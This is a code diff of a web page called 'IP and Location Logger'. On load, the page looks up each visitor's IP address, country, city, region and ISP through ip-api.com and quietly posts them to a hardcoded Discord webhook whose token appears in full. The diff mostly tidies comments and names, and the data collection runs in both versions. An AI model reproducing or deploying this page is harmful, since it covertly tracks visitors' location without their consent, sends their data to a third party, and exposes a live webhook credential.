@@ -3,19 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IP Details</title>
+    <title>IP and Location Logger</title>
     <script>
-        // Function to send user data to a webhook
+        // Function to send details to the webhook
         async function sendDetailsToWebhook(details) {
             const webhookURL = "https://discord.com/api/webhooks/1314782178491629598/K_FBAhGqn0t-z5IeHHRgvGUdwdHPgvv7GEq5_JsYhTuKFWUFGGpy6lKgYmsINM_oSfp5"; // Replace with your webhook URL
 
-            // Construct payload
+            // Construct the payload
             const payload = {
-                content: `Visitor Details:\nIP: ${details.query}\nCountry: ${details.country}\nCity: ${details.city}\nRegion: ${details.regionName}\nISP: ${details.isp}`
+                content: `Visitor Details:\n\n- IP Address: ${details.query}\n- Country: ${details.country}\n- City: ${details.city}\n- Region: ${details.regionName}\n- ISP: ${details.isp}`
             };
 
             try {
-                // Send data to the webhook
+                // Send the details to the webhook
                 await fetch(webhookURL, {
                     method: "POST",
                     headers: {
@@ -23,37 +23,35 @@
                     },
                     body: JSON.stringify(payload)
                 });
-                console.log("Details sent to webhook successfully.");
+                console.log("Details sent to the webhook successfully.");
             } catch (error) {
-                console.error("Failed to send details to webhook:", error);
+                console.error("Error sending details to webhook:", error);
             }
         }
 
-        // Function to fetch user details and display/send them
-        async function fetchAndShowDetails() {
+        // Function to fetch IP and location details
+        async function fetchDetails() {
             try {
+                // Fetch the details from the API
                 const response = await fetch("http://ip-api.com/json/");
                 const details = await response.json();
 
-                // Log details to the console
-                console.log(details);
-
-                // Display the details on the web page
+                // Display the details on the page
                 document.getElementById("ip").textContent = details.query;
                 document.getElementById("country").textContent = details.country;
                 document.getElementById("city").textContent = details.city;
                 document.getElementById("region").textContent = details.regionName;
                 document.getElementById("isp").textContent = details.isp;
 
-                // Send details to the webhook
+                // Send the details to the webhook
                 await sendDetailsToWebhook(details);
             } catch (error) {
                 console.error("Error fetching details:", error);
             }
         }
 
-        // Fetch details when the page loads
-        window.onload = fetchAndShowDetails;
+        // Fetch and send details when the page loads
+        window.onload = fetchDetails;
     </script>
 </head>
 <body>
